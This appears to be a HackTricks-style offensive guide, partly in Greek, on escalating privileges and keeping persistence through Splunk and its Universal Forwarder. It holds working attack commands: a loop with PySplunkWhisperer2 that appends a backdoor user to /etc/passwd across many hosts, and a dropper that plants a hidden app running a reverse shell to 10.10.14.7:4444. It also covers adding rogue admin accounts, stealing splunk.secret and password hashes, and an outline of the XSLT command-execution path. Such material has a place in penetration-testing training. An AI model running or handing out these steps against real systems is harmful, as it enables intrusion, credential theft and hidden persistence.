# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

If **enumerating** a machine **internally** or **externally** you find **Splunk running** (usually **8000** for the web UI and **8089** for the management API), valid credentials can often be turned into **code execution** through app installation, scripted inputs, or management actions. If Splunk is running as **root**, that frequently becomes an immediate **privilege escalation**.

If you only need the generic remote attack surface, enumeration, or app-upload RCE path, check:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

If you are **already root** and the Splunk service is not listening only on localhost, you can also steal **Splunk password hashes**, recover **encrypted secrets**, or push a **malicious app** to keep persistence locally or across multiple forwarders.

## Interesting Local Files

When you land on a host running Splunk or Splunk Universal Forwarder, these are usually the most interesting paths:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Artifacts σημαντικά:

- **`$SPLUNK_HOME/etc/passwd`**: τοπικοί Splunk users και password hashes.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: key που χρησιμοποιεί το Splunk για να encrypt secrets που αποθηκεύονται σε αρκετά `.conf` files.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: initial admin bootstrap file· χρήσιμο σε gold images και provisioning mistakes. Αγνοείται αν το `etc/passwd` υπάρχει ήδη.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: όπου συνήθως ενεργοποιούνται scripted inputs.
- **`$SPLUNK_HOME/etc/deployment-apps/`** ή **`$SPLUNK_HOME/etc/apps/`**: καλά μέρη για να κρύψεις ένα persistent app ή να ελέγξεις τι ήδη διανέμεται.

## Splunk Universal Forwarder Agent Exploit Summary

Για περισσότερες λεπτομέρειες δες [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Αυτό είναι μόνο μια περίληψη:

**Exploit overview:**
Ένα exploit που στοχεύει το Splunk Universal Forwarder (UF) επιτρέπει σε attackers με τον **agent password** να εκτελέσουν arbitrary code σε systems που τρέχουν τον agent, θέτοντας potentially σε κίνδυνο ένα μεγάλο μέρος του environment.

**Γιατί δουλεύει:**

- Η UF management service είναι συνήθως exposed στο **TCP 8089**.
- Οι attackers μπορούν να authenticate στο API και να δώσουν εντολή στον forwarder να εγκαταστήσει ένα **malicious app bundle**.
- Η ίδια primitive μπορεί να χρησιμοποιηθεί τοπικά για **LPE** ή απομακρυσμένα για **RCE**.
- Public tooling όπως το **SplunkWhisperer2** δημιουργεί αυτόματα το app bundle και μπορεί να προσαρμόσει payloads για Linux targets.

**Συνηθισμένοι τρόποι ανάκτησης του password:**

- Cleartext credentials σε documentation, scripts, shares ή deployment automation.
- Password hashes μέσα στο `$SPLUNK_HOME/etc/passwd` και στη συνέχεια offline cracking.
- Golden images ή provisioning leftovers όπως το `user-seed.conf`.

**Impact:**

- SYSTEM/root-level code execution σε κάθε compromised host.
- Deployment persistent apps, backdoors ή ransomware.
- Απενεργοποίηση ή tampering με telemetry πριν τα δεδομένα forward-αριστούν.

**Example command for exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Χρήσιμα public exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence via Scripted Inputs or Malicious Apps

Αν έχεις **filesystem write access** ως `root`/`splunk`, ή authenticated access για να εγκαθιστάς apps, ένας πολύ αξιόπιστος μηχανισμός persistence είναι να αφήσεις ένα **custom app** με ένα **scripted input**. Η ίδια η documentation του Splunk αναμένει τα scripted inputs να βρίσκονται κάτω από έναν app directory και να ενεργοποιούνται από το `inputs.conf`.

Typical layout:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Ελάχιστο `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Γρήγορο Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Σημειώσεις:

- Το ίδιο trick λειτουργεί στο **Universal Forwarder** χρησιμοποιώντας `/opt/splunkforwarder/etc/apps/`.
- Οι attackers συχνά αναμειγνύονται στο περιβάλλον τροποποιώντας ένα νόμιμο add-on αντί να δημιουργούν ένα προφανώς malicious app.
- Σε έναν **deployment server**, η τοποθέτηση ενός malicious app μέσα στο `deployment-apps/` μετατρέπεται σε **fleet-wide persistence** επειδή οι forwarders κάνουν poll, κατεβάζουν updated apps και συχνά κάνουν restart για να τις εφαρμόσουν.

## Credential Theft and Admin Takeover

Αν μπορείς να διαβάσεις τα τοπικά αρχεία του Splunk, συνήθως υπάρχουν δύο καλοί στόχοι: ανάκτηση **Splunk admin access** και ανάκτηση **encrypted service credentials**.

### Password hashes and local users

Το Splunk αποθηκεύει τα τοπικά authentication data στο `etc/passwd`. Ανάλογα με το deployment, το cracking αυτού του αρχείου μπορεί να ανακτήσει working credentials για το web UI και το management API.

Αν έχεις ήδη έγκυρα **admin** credentials και το Splunk χρησιμοποιεί το **native** authentication backend του, το ίδιο το CLI μπορεί να χρησιμοποιηθεί για persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` και encrypted values

Το Splunk χρησιμοποιεί το `etc/auth/splunk.secret` για να προστατεύει sensitive values που αποθηκεύονται σε πολλαπλά configuration files. Αν μπορείς να κλέψεις τόσο το **secret** όσο και τα σχετικά **`.conf` files**, συχνά μπορείς να ανακτήσεις ή να replay:

- forwarder/indexer shared secrets όπως `pass4SymmKey`
- TLS private-key passwords όπως `sslPassword`
- LDAP bind credentials όπως `bindDNPassword`

Αυτό είναι χρήσιμο για **lateral movement** ακόμα και όταν το Splunk admin password δεν είναι crackable.

### `user-seed.conf` abuse

Το `user-seed.conf` χρησιμοποιείται μόνο κατά το πρώτο start ή όταν δεν υπάρχει το `etc/passwd`. Αυτό το κάνει λιγότερο χρήσιμο σε live box, αλλά πολύ ενδιαφέρον σε:

- compromised installation templates
- container images
- unattended provisioning workflows
- appliances όπου το Splunk reinitialized automatically

Σε αυτές τις περιπτώσεις, το να φυτέψεις ένα `HASHED_PASSWORD` που έχει παραχθεί με `splunk hash-passwd` σου δίνει έναν ήσυχο τρόπο να ανακτήσεις admin access μετά το redeployment.

## Abusing Splunk Queries

Για περισσότερες λεπτομέρειες έλεγξε [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Μια χρήσιμη πρόσφατη technique είναι η κατάχρηση του **user-supplied XSLT** σε vulnerable Splunk Enterprise versions για να μετατρέψεις έναν authenticated account με χαμηλά privileges σε **OS command execution** ως ο `splunk` user.

High-level flow:

1. Authenticate to Splunk.
2. Upload a malicious **XSL** file μέσω της preview/upload functionality.
3. Κάνε το Splunk να render search results με αυτό το uploaded stylesheet από το **dispatch** directory.
4. Χρησιμοποίησε το XSLT payload για να γράψεις ένα file ή να trigger execution μέσω του Splunk's search pipeline (για example με το να φτάσεις internal functionality όπως `runshellscript`).

Το σημαντικό offensive takeaway είναι ότι αυτό το path είναι **post-auth RCE without needing app upload**. Στο Linux συνήθως σε βάζει στο **`splunk`** account, το οποίο παραμένει πολύτιμο επειδή αυτός ο user συχνά owns the application tree, μπορεί να read secrets, και μπορεί να plant persistent apps που επιβιώνουν από shell loss.

A representative path used during exploitation is:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Αν το Splunk εκτελείται με πάρα πολλά privileges, ή αν ο χρήστης `splunk` έχει πρόσβαση σε επικίνδυνα scripts, writable service units, ή κακούς `sudo` rules, αυτό γίνεται μια καθαρή αλυσίδα **LPE**.

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
